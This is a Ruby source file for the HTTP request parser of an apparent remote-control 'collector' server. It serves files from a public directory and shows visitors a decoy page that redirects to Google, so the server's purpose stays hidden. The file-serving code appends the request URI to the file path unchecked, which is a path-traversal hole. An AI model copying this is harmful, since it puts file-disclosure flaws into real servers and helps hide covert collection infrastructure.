#
#  
#

# from RCS::Common
require 'rcs-common/trace'


module RCS
module Collector

module Parser
  include RCS::Tracer

  # parse a request from a client
  #
  def http_parse(req_method, req_uri, req_cookie, req_content)

    resp_content = ""
    resp_content_type = "text/html"
    resp_cookie = nil

    case req_method
      when 'GET'
        # serve the requested file
        resp_content = http_get_file req_uri
        # the file was not found, display the decoy
        resp_content = http_decoy_page if resp_content.length == 0
      when 'POST'
        trace :debug, req_method
      else
        # everything that we don't understand will get the decoy page
        resp_content = http_decoy_page
    end

    return resp_content, resp_content_type, resp_cookie
  end

  # display a fake page in case someone is trying to connect to the collector
  # with a browser or something else
  def http_decoy_page
    # default decoy page
    page = "<html> <head>" +
           "<meta http-equiv=\"refresh\" content=\"0;url=http://www.google.com\">" +
           "</head> </html>"

    # custom decoy page
    file_path = Dir.pwd + "/config/decoy.html"
    page = File.read(file_path) if File.exist?(file_path)

    trace :info, "[#{@peer}] Decoy page displayed"

    return page
  end

  # returns the content of a file in the public directory
  def http_get_file(uri)

    content = ""

    # search the file in the public directory
    file_path = Dir.pwd + "/public" + uri

    trace :info, "[#{@peer}] serving #{file_path}"

    # load the content of the file
    content = File.read(file_path) if File.exist?(file_path) and File.file?(file_path)

    if content.length != 0
      trace :info, "[#{@peer}] " + File.size(file_path).to_s + " bytes served"
    else
      trace :info, "[#{@peer}] file not found"
    end

    return content
  end

end #Parser

end #Collector::
end #RCS::